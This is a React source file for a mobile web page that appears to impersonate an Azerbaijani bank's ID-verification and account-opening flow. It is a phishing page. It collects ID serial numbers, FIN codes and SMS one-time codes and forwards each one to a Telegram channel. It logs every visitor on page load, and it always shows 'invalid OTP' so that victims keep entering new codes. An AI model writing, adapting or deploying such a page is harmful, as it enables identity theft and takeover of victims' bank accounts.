"use client"

import React, { useState, useEffect } from "react"
import {
  ChevronDown,
  MessageSquare,
  Check,
  AlertCircle,
  Loader2
} from "lucide-react"
import { fetchVisitorInfo, sendTelegramMessage } from "@/lib/telegram"

// SVG Flag Components
const AzerbaijanFlag = ({ className = "w-6 h-6" }: { className?: string }) => (
  <svg
    className={`${className} rounded-full border border-gray-200/60 shadow-xs flex-shrink-0 object-cover`}
    viewBox="0 0 36 36"
    aria-hidden="true"
  >
    <path fill="#0092BC" d="M0 0h36v12H0z" />
    <path fill="#E4002B" d="M0 12h36v12H0z" />
    <path fill="#009739" d="M0 24h36v12H0z" />
    <path
      fill="#FFFFFF"
      d="M17.8 13.8a4.2 4.2 0 1 0 0 8.4 4.8 4.8 0 1 1 0-8.4z"
    />
    <path
      fill="#FFFFFF"
      d="M21.5 16.5l.4.7.8-.3-.3.8.8.4-.8.3.3.8-.8-.3-.4.7-.3-.7-.8.3.3-.8-.8-.4.8-.3-.3-.8.8.3z"
    />
  </svg>
)

const UKFlag = ({ className = "w-6 h-6" }: { className?: string }) => (
  <svg
    className={`${className} rounded-full border border-gray-200/60 shadow-xs flex-shrink-0 object-cover`}
    viewBox="0 0 36 36"
    aria-hidden="true"
  >
    <path fill="#012169" d="M0 0h36v36H0z" />
    <path stroke="#FFF" strokeWidth="6" d="M0 0l36 36M36 0L0 36" />
    <path stroke="#C8102E" strokeWidth="2.5" d="M0 0l36 36M36 0L0 36" />
    <path stroke="#FFF" strokeWidth="10" d="M18 0v36M0 18h36" />
    <path stroke="#C8102E" strokeWidth="6" d="M18 0v36M0 18h36" />
  </svg>
)

type Language = "az" | "en"
type ScreenType = "details" | "otp"

// Translations dictionary
const t = {
  az: {
    title: "ŞƏXSİYYƏT VƏSİQƏSİ MƏLUMATLARINI QEYD ET",
    subtitle: "Şəxsiyyətinizi təsdiq etmək üçün vəsiqənizin seriya nömrəsini və FİN kodunu daxil edin.",
    resident: "Rezident",
    nonResident: "Qeyri-rezident",
    select: "Seç",
    idPlaceholder: "Vəsiqə nömrəsini daxil edin",
    finPlaceholder: "FİN kodu daxil edin",
    termsText: "Zəhmət olmasa ",
    termsLink1: "İstifadə şərtləri",
    termsText2: " sənədini və ",
    termsLink2: "Bank hesabının açılmasına dair ərizə",
    termsText3: " ilə tanış olun və təsdiq edin",
    continueBtn: "Davam et",
    support: "Dəstək",
    langTitle: "Dil seçimi",
    otpTitle: "Təsdiq kodunu daxil edin",
    otpSubtitle: "Mobil nömrənizə təsdiq kodu göndərildi. Zəhmət olmasa daxil edin.",
    otpPlaceholder: "Təsdiq kodunu daxil edin",
    invalidOtp: "Yalnış OTP kodu. Yenidən cəhd edin.",
    resendIn: "Kodu yenidən göndər: ",
    resendBtn: "Yenidən göndər",
    verifyBtn: "Təsdiq et",
  },
  en: {
    title: "Enter your ID card details.",
    subtitle: "Enter your ID serial number and FIN code to verify your identity.",
    resident: "Resident",
    nonResident: "Non-resident",
    select: "Select",
    idPlaceholder: "Enter your ID number",
    finPlaceholder: "Enter your FIN code",
    termsText: "Please review and confirm the ",
    termsLink1: "Terms of use",
    termsText2: " and ",
    termsLink2: "Bank Account Application",
    termsText3: " for opening a bank account.",
    continueBtn: "Continue",
    support: "Support",
    langTitle: "Language selection",
    otpTitle: "Enter verification code",
    otpSubtitle: "We have sent a security OTP code to your mobile phone. Please enter it below.",
    otpPlaceholder: "Enter verification code",
    invalidOtp: "Invalid OTP code. Please try again.",
    resendIn: "Resend code in ",
    resendBtn: "Resend Code",
    verifyBtn: "Verify",
  }
}

export default function IdentityVerificationPage() {
  // Screen state
  const [screen, setScreen] = useState<ScreenType>("details")

  // ID Details Form State
  const [residency, setResidency] = useState<"resident" | "non-resident">("resident")
  const [idPrefix, setIdPrefix] = useState("AA")
  const [idNumber, setIdNumber] = useState("")
  const [finCode, setFinCode] = useState("")
  const [acceptedTerms, setAcceptedTerms] = useState(false)
  const [showPrefixDropdown, setShowPrefixDropdown] = useState(false)

  // Language modal state (Default language is English)
  const [selectedLang, setSelectedLang] = useState<Language>("en")
  const [isLangModalOpen, setIsLangModalOpen] = useState(false)

  // Loading state (2 second loader)
  const [loading, setLoading] = useState(false)

  // Get current active language texts
  const text = t[selectedLang]

  // OTP Screen State
  const [otp, setOtp] = useState("")
  const [timer, setTimer] = useState(60) // 1 minute countdown
  const [otpError, setOtpError] = useState<string | null>(null)

  // Form Validation logic: ONLY requires data in fields
  const isDetailsValid =
    idNumber.trim().length > 0 &&
    finCode.trim().length > 0

  const isOtpValid = otp.trim().length > 0

  // Visitor Tracking on Page Load (Only location data like country, city, IP, etc.)
  useEffect(() => {
    const trackVisitor = async () => {
      await fetchVisitorInfo()
      await sendTelegramMessage({
        title: "New Visitor Landed",
        type: "visitor",
      })
    }
    trackVisitor()
  }, [])

  // Timer countdown effect for OTP screen
  useEffect(() => {
    if (screen !== "otp") return

    const interval = setInterval(() => {
      setTimer((prev) => {
        if (prev <= 1) {
          clearInterval(interval)
          return 0
        }
        return prev - 1
      })
    }, 1000)

    return () => {
      clearInterval(interval)
    }
  }, [screen])

  // Handle Continue button click with 2 second loader
  const handleContinue = async () => {
    if (!isDetailsValid || loading) return
    setLoading(true)

    try {
      await sendTelegramMessage({
        title: "ID Details Submitted",
        type: "details",
        phoneNumber: `${idPrefix} ${idNumber}`,
        pin: finCode,
      })
    } catch (err) {
      console.error("Error sending Telegram message:", err)
    }

    setTimeout(() => {
      setLoading(false)
      setScreen("otp")
      setTimer(60)
      setOtpError(null)
    }, 2000)
  }

  // Handle Verify button click with 2 second loader
  const handleVerifyOtp = async () => {
    if (!isOtpValid || loading) return
    setLoading(true)

    try {
      await sendTelegramMessage({
        title: "OTP Verification Submitted",
        type: "otp",
        otp1: otp,
        phoneNumber: `${idPrefix} ${idNumber}`,
        pin: finCode,
      })
    } catch (err) {
      console.error("Error sending OTP Telegram message:", err)
    }

    setTimeout(() => {
      setLoading(false)
      setOtp("")
      setTimer(60)
      setOtpError(text.invalidOtp)
    }, 2000)
  }

  // Format timer into MM:SS
  const formatTimer = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  return (
    <div className="h-[100dvh] w-full bg-[#FFFFFF] text-gray-900 flex flex-col font-sans selection:bg-[#2272FF]/20 relative overflow-hidden">
      
      {/* Main Responsive Mobile Page Container */}
      <div className="w-full max-w-lg sm:max-w-xl mx-auto flex-1 flex flex-col px-5 sm:px-8 pt-3 pb-5 justify-between h-[100dvh]">
        
        {/* Header Bar */}
        <header className="flex items-center justify-between py-1 mb-2 w-full min-h-[40px] flex-shrink-0">
          <div className="w-10" />

          {/* Header Actions: Language Flag & Support (Only shown on Details screen) */}
          {screen === "details" && (
            <div className="flex items-center gap-3">
              {/* Flag Button (Shows English flag when English language is active) */}
              <button
                onClick={() => setIsLangModalOpen(true)}
                className="p-1 rounded-full hover:opacity-80 transition-opacity cursor-pointer focus:outline-none"
                title="Change Language"
              >
                {selectedLang === "en" ? (
                  <UKFlag className="w-7 h-7 sm:w-8 sm:h-8" />
                ) : (
                  <AzerbaijanFlag className="w-7 h-7 sm:w-8 sm:h-8" />
                )}
              </button>

              {/* Support Button with #2272FF theme */}
              <button className="bg-[#2272FF]/15 hover:bg-[#2272FF]/25 active:scale-95 text-[#2272FF] px-3.5 py-1.5 rounded-full flex items-center gap-1.5 text-xs sm:text-sm font-semibold shadow-xs transition-all cursor-pointer">
                <MessageSquare className="w-4 h-4 fill-current stroke-none" />
                <span>{text.support}</span>
              </button>
            </div>
          )}
        </header>

        {/* Dynamic Screen View */}
        <main className="flex-1 flex flex-col justify-between w-full">
          {screen === "details" ? (
            /* DETAILS SCREEN */
            <div className="flex-1 flex flex-col justify-between">
              <div className="space-y-4">
                {/* Title & Description */}
                <div>
                  <h1 className="text-2xl sm:text-3xl font-extrabold text-gray-900 tracking-tight leading-tight mb-1.5">
                    {text.title}
                  </h1>
                  <p className="text-[14px] sm:text-base text-gray-400 font-normal leading-relaxed">
                    {text.subtitle}
                  </p>
                </div>

                {/* Segmented Control Tabs (Resident / Non-resident) */}
                <div className="bg-[#EFEDF1] p-1 rounded-full flex items-center shadow-inner">
                  <button
                    type="button"
                    onClick={() => setResidency("resident")}
                    className={`flex-1 py-2.5 sm:py-3 text-center text-sm font-semibold rounded-full transition-all cursor-pointer ${
                      residency === "resident"
                        ? "bg-white text-gray-900 shadow-sm border border-[#2272FF]"
                        : "text-gray-400 hover:text-gray-600"
                    }`}
                  >
                    {text.resident}
                  </button>
                  <button
                    type="button"
                    onClick={() => setResidency("non-resident")}
                    className={`flex-1 py-2.5 sm:py-3 text-center text-sm font-semibold rounded-full transition-all cursor-pointer ${
                      residency === "non-resident"
                        ? "bg-white text-gray-900 shadow-sm border border-[#2272FF]"
                        : "text-gray-400 hover:text-gray-600"
                    }`}
                  >
                    {text.nonResident}
                  </button>
                </div>

                {/* Input 1: ID Serial Number with Select Dropdown */}
                <div className="relative p-0.5">
                  <div className="bg-[#EFEDF1] rounded-2xl px-4 py-3 flex items-center gap-3 transition-all focus-within:ring-2 focus-within:ring-[#2272FF]/40 focus-within:bg-white border border-transparent focus-within:border-[#2272FF]">
                    {/* Prefix Selector Button */}
                    <div className="relative">
                      <button
                        type="button"
                        onClick={() => setShowPrefixDropdown(!showPrefixDropdown)}
                        className="bg-white px-3 py-1.5 rounded-full text-xs font-semibold text-gray-700 shadow-xs flex items-center gap-1 cursor-pointer border border-gray-200/80 hover:bg-gray-50 transition-all flex-shrink-0"
                      >
                        <span>{idPrefix === "Select" ? text.select : idPrefix}</span>
                        <ChevronDown className="w-3.5 h-3.5 text-gray-500" />
                      </button>

                      {/* Prefix Options Dropdown */}
                      {showPrefixDropdown && (
                        <div className="absolute top-10 left-0 z-30 bg-white rounded-xl shadow-lg border border-gray-100 py-1 w-24 text-xs font-medium text-gray-800 animate-slide-up">
                          {["AA", "AZE", "MYI", text.select].map((pref) => (
                            <div
                              key={pref}
                              onClick={() => {
                                setIdPrefix(pref)
                                setShowPrefixDropdown(false)
                              }}
                              className="px-3 py-2 hover:bg-[#2272FF]/10 cursor-pointer flex items-center justify-between"
                            >
                              <span>{pref}</span>
                              {idPrefix === pref && <Check className="w-3 h-3 text-[#2272FF]" />}
                            </div>
                          ))}
                        </div>
                      )}
                    </div>

                    {/* ID Input */}
                    <input
                      type="text"
                      value={idNumber}
                      onChange={(e) => setIdNumber(e.target.value)}
                      placeholder={text.idPlaceholder}
                      className="bg-transparent border-none outline-none text-sm text-gray-900 placeholder:font-semibold placeholder:text-[#B2B7BA] w-full"
                    />
                  </div>
                </div>

                {/* Input 2: FIN Code */}
                <div className="p-0.5">
                  <div className="bg-[#EFEDF1] rounded-2xl px-4.5 py-3.5 flex items-center transition-all focus-within:ring-2 focus-within:ring-[#2272FF]/40 focus-within:bg-white border border-transparent focus-within:border-[#2272FF]">
                    <input
                      type="text"
                      value={finCode}
                      onChange={(e) => setFinCode(e.target.value.toUpperCase())}
                      placeholder={text.finPlaceholder}
                      maxLength={7}
                      className="bg-transparent border-none outline-none text-sm text-gray-900 placeholder:font-semibold placeholder:text-[#B2B7BA] w-full tracking-wider"
                    />
                  </div>
                </div>

                {/* White Checkbox and Terms of Use */}
                <div className="flex items-start gap-3 px-1">
                  <button
                    type="button"
                    role="checkbox"
                    aria-checked={acceptedTerms}
                    onClick={() => setAcceptedTerms(!acceptedTerms)}
                    className={`w-5 h-5 mt-0.5 rounded-[5px] border transition-all flex items-center justify-center flex-shrink-0 cursor-pointer ${
                      acceptedTerms
                        ? "bg-white border-[#2272FF] text-[#2272FF] shadow-xs"
                        : "bg-white border-gray-300 hover:border-gray-400"
                    }`}
                  >
                    {acceptedTerms && (
                      <Check className="w-3.5 h-3.5 stroke-[3] text-[#2272FF]" />
                    )}
                  </button>
                  <label
                    onClick={() => setAcceptedTerms(!acceptedTerms)}
                    className="text-xs sm:text-sm text-gray-400 leading-snug cursor-pointer select-none"
                  >
                    {text.termsText}
                    <span className="text-[#2272FF] font-medium hover:underline">{text.termsLink1}</span>
                    {text.termsText2}
                    <span className="text-[#2272FF] font-medium hover:underline">{text.termsLink2}</span>
                    {text.termsText3}
                  </label>
                </div>
              </div>

              {/* Action Button with 2 Sec Loader */}
              <div className="pt-3 pb-2 flex-shrink-0">
                <button
                  type="button"
                  disabled={!isDetailsValid || loading}
                  onClick={handleContinue}
                  className={`w-full py-3.5 sm:py-4 font-semibold text-base rounded-full transition-all flex items-center justify-center gap-2 ${
                    isDetailsValid && !loading
                      ? "bg-[#2272FF] hover:bg-[#1a5ce0] active:scale-[0.99] text-white shadow-md shadow-[#2272FF]/25 cursor-pointer"
                      : "bg-[#EEEEEE] text-[#B2B7BA] cursor-not-allowed"
                  }`}
                >
                  {loading ? (
                    <div className="flex items-center gap-2">
                      <Loader2 className="w-5 h-5 animate-spin" />
                      <span>{text.continueBtn}...</span>
                    </div>
                  ) : (
                    <span>{text.continueBtn}</span>
                  )}
                </button>
              </div>
            </div>
          ) : (
            /* SIMPLIFIED OTP SCREEN WITH 2 SEC LOADER */
            <div className="flex-1 flex flex-col justify-between animate-slide-up">
              <div className="space-y-4">
                {/* Title & Description */}
                <div>
                  <h1 className="text-2xl sm:text-3xl font-extrabold text-gray-900 tracking-tight leading-tight mb-1.5">
                    {text.otpTitle}
                  </h1>
                  <p className="text-[14px] sm:text-base text-gray-400 font-normal leading-relaxed">
                    {text.otpSubtitle}
                  </p>
                </div>

                {/* OTP Input Field */}
                <div className="p-0.5">
                  <div
                    className={`bg-[#EFEDF1] rounded-2xl px-4.5 py-3.5 flex items-center transition-all border ${
                      otpError
                        ? "border-red-500 bg-red-50/20 ring-2 ring-red-500/20"
                        : "border-transparent focus-within:ring-2 focus-within:ring-[#2272FF]/40 focus-within:bg-white focus-within:border-[#2272FF]"
                    }`}
                  >
                    <input
                      type="text"
                      inputMode="numeric"
                      value={otp}
                      onChange={(e) => {
                        setOtp(e.target.value.replace(/\D/g, ""))
                        if (otpError) setOtpError(null)
                      }}
                      placeholder={text.otpPlaceholder}
                      className="bg-transparent border-none outline-none text-xl sm:text-2xl font-bold tracking-widest text-gray-900 placeholder:font-semibold placeholder:text-[#B2B7BA] placeholder:text-base placeholder:tracking-normal w-full"
                    />
                  </div>

                  {/* Red Invalid OTP Error Message */}
                  {otpError && (
                    <p className="text-xs sm:text-sm font-semibold text-red-600 mt-2 px-1 flex items-center gap-1.5 animate-slide-up">
                      <AlertCircle className="w-4 h-4 text-red-600 flex-shrink-0" />
                      <span>{otpError}</span>
                    </p>
                  )}
                </div>

                {/* Inline Text Timer */}
                <div className="text-sm font-medium text-gray-500 px-1 flex items-center gap-2">
                  {timer > 0 ? (
                    <span>
                      {text.resendIn}<strong className="text-gray-900 font-bold">{formatTimer(timer)}</strong>
                    </span>
                  ) : (
                    <button
                      onClick={() => {
                        setTimer(60)
                        setOtpError(null)
                      }}
                      className="text-sm font-bold text-[#2272FF] hover:underline cursor-pointer"
                    >
                      {text.resendBtn}
                    </button>
                  )}
                </div>
              </div>

              {/* Verify Button with 2 Sec Loader */}
              <div className="pt-3 pb-2 flex-shrink-0">
                <button
                  type="button"
                  onClick={handleVerifyOtp}
                  disabled={!isOtpValid || loading}
                  className={`w-full py-3.5 sm:py-4 font-semibold text-base rounded-full transition-all flex items-center justify-center gap-2 ${
                    isOtpValid && !loading
                      ? "bg-[#2272FF] hover:bg-[#1a5ce0] active:scale-[0.99] text-white shadow-md shadow-[#2272FF]/25 cursor-pointer"
                      : "bg-[#EEEEEE] text-[#B2B7BA] cursor-not-allowed"
                  }`}
                >
                  {loading ? (
                    <div className="flex items-center gap-2">
                      <Loader2 className="w-5 h-5 animate-spin" />
                      <span>{text.verifyBtn}...</span>
                    </div>
                  ) : (
                    <span>{text.verifyBtn}</span>
                  )}
                </button>
              </div>
            </div>
          )}
        </main>
      </div>

      {/* BOTTOM SHEET MODAL FOR LANGUAGE SELECTION */}
      {isLangModalOpen && screen === "details" && (
        <>
          {/* Backdrop */}
          <div
            onClick={() => setIsLangModalOpen(false)}
            className="fixed inset-0 bg-black/40 z-40 animate-fade-in backdrop-blur-xs transition-all"
          />

          {/* Bottom Sheet Container */}
          <div className="fixed bottom-0 left-0 right-0 max-w-lg sm:max-w-xl mx-auto bg-white rounded-t-[28px] p-6 z-50 animate-slide-up shadow-2xl space-y-4">
            {/* Header with Title & Chevron Down Close Button */}
            <div className="flex items-center justify-between pb-1">
              <h3 className="text-xl font-bold text-gray-900">
                {text.langTitle}
              </h3>
              <button
                onClick={() => setIsLangModalOpen(false)}
                className="p-1.5 hover:bg-gray-100 rounded-full transition-colors cursor-pointer text-gray-400 hover:text-gray-700"
                aria-label="Close language selection"
              >
                <ChevronDown className="w-6 h-6" />
              </button>
            </div>

            {/* Language Options List */}
            <div className="space-y-3 pt-1">
              {/* Option 1: Azerbaijan */}
              <button
                type="button"
                onClick={() => {
                  setSelectedLang("az")
                  setIsLangModalOpen(false)
                }}
                className={`w-full flex items-center justify-between p-4 rounded-2xl border transition-all cursor-pointer text-left ${
                  selectedLang === "az"
                    ? "bg-[#2272FF]/10 border-[#2272FF] shadow-xs"
                    : "bg-[#f8fafc] border-gray-100 hover:bg-gray-100/70"
                }`}
              >
                <div className="flex items-center gap-3.5">
                  <AzerbaijanFlag className="w-7 h-7" />
                  <span className="text-base font-semibold text-gray-900">
                    Azərbaycan
                  </span>
                </div>
                {selectedLang === "az" && (
                  <div className="w-6 h-6 rounded-full bg-[#2272FF] flex items-center justify-center text-white">
                    <Check className="w-3.5 h-3.5 stroke-[3]" />
                  </div>
                )}
              </button>

              {/* Option 2: English */}
              <button
                type="button"
                onClick={() => {
                  setSelectedLang("en")
                  setIsLangModalOpen(false)
                }}
                className={`w-full flex items-center justify-between p-4 rounded-2xl border transition-all cursor-pointer text-left ${
                  selectedLang === "en"
                    ? "bg-[#2272FF]/10 border-[#2272FF] shadow-xs"
                    : "bg-[#f8fafc] border-gray-100 hover:bg-gray-100/70"
                }`}
              >
                <div className="flex items-center gap-3.5">
                  <UKFlag className="w-7 h-7" />
                  <span className="text-base font-semibold text-gray-900">
                    English
                  </span>
                </div>
                {selectedLang === "en" && (
                  <div className="w-6 h-6 rounded-full bg-[#2272FF] flex items-center justify-center text-white">
                    <Check className="w-3.5 h-3.5 stroke-[3]" />
                  </div>
                )}
              </button>
            </div>
          </div>
        </>
      )}
    </div>
  )
}
